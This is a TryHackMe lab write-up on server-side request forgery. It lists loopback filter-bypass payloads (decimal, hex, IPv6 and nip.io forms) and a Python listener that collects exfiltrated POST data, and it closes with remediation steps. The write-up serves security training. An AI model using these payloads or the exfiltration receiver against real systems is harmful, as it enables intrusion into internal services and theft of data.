# Server-Side Request Forgery (SSRF) — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Web_Security-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange.svg)
![Topic](https://img.shields.io/badge/Topic-SSRF_&_Out--of--Band-purple.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A complete penetration testing writeup for the **Server-Side Request Forgery (SSRF)** lab on TryHackMe, demonstrating internal service port scanning, cloud metadata access, and out-of-band data exfiltration.

---

## 📋 Executive Summary
Server-Side Request Forgery (SSRF) occurs when a web application fetches a remote resource without properly validating the user-supplied destination URL. In this lab, SSRF vulnerabilities were exploited to access loopback-restricted administration services (`http://127.0.0.1:8080`) and exfiltrate internal system data to an attacker-controlled HTTP listener (`server.py`), saving results to `data.html`.

* **Vulnerability:** Server-Side Request Forgery (SSRF)
* **Artifacts in Directory:**
  * `server.py`: Custom HTTP receiver server logging exfiltrated POST requests
  * `data.html`: Logged exfiltration data

---

## 🔍 Stage 1: Vulnerability Identification

The web application provides an automated URL preview / webhook feature taking a target URL parameter:
```http
POST /fetch_url HTTP/1.1
Host: target.thm
Content-Type: application/x-www-form-urlencoded

url=http://example.com
```

### 1.1 Probing Internal Loopback (127.0.0.1)
Supplying internal loopback addresses bypasses perimeter firewalls:
* `http://127.0.0.1/admin`
* `http://localhost:8080/internal_status`

If `127.0.0.1` is blacklisted by naive input filters, bypasses include:
* Alternative IP encodings: `http://2130706433` (Decimal) or `http://0x7f000001` (Hexadecimal)
* IPv6 representations: `http://[::1]`
* DNS pinning / domains resolving to loopback (e.g. `127.0.0.1.nip.io`).

---

## 💥 Stage 2: Out-of-Band Data Exfiltration (`server.py`)

When internal endpoints process requests without directly rendering the response body, we trigger out-of-band exfiltration by directing the internal service to POST sensitive data to our custom Python server:

```python
from http.server import SimpleHTTPRequestHandler, HTTPServer

class CustomRequestHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        super().end_headers()

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length).decode('utf-8')
        print(f"[+] Received exfiltration: {post_data}")
        with open('data.html', 'a') as f:
            f.write(post_data + '\n')
        self.send_response(200)
        self.end_headers()

if __name__ == '__main__':
    httpd = HTTPServer(('', 8080), CustomRequestHandler)
    print("Listening on port 8080...")
    httpd.serve_forever()
```

Sensitive tokens and internal flags received by `server.py` are saved into `data.html`.

---

## 🛡️ Remediation
1. **Strict Destination Whitelisting:** Validate supplied URLs against a strict whitelist of approved external hostnames and protocols (HTTP/HTTPS only).
2. **Block Private Subnets (RFC 1918 & Cloud Metadata):** Block connections resolving to private and loopback address spaces (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, and cloud metadata `169.254.169.254`).
3. **IMDSv2 Enforce:** On AWS EC2 environments, transition to IMDSv2, requiring session tokens (`PUT` requests) that defeat simple SSRF GET vectors.
